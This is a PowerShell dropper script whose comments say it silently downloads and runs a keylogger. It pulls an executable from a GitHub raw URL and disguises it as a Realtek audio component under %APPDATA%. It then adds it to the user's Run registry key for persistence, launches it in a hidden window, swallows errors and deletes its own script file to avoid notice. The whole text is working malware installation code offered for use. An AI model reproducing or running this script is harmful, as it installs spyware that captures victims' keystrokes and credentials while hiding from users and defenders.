# Silent download and execution of the keylogger exe
$exeUrl = "https://github.com/webhookrepo195/mypresonalwebhookfile109/raw/refs/heads/main/Realtek%20Audio%20device.exe"

# Use NO SPACES in filename
$exePath = "$env:APPDATA\Realtek\RealtekAudioDevice.exe"   # ← fixed: no space

# Create hidden folder if needed
$folder = "$env:APPDATA\Realtek"
if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force }

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
} catch {
    # Fail silently
}

# Add to current user startup (no admin needed)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "RealtekAudioHelper"
Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorAction SilentlyContinue

# Run hidden (no window)
Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue

# Self-delete the .ps1 for stealth
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue


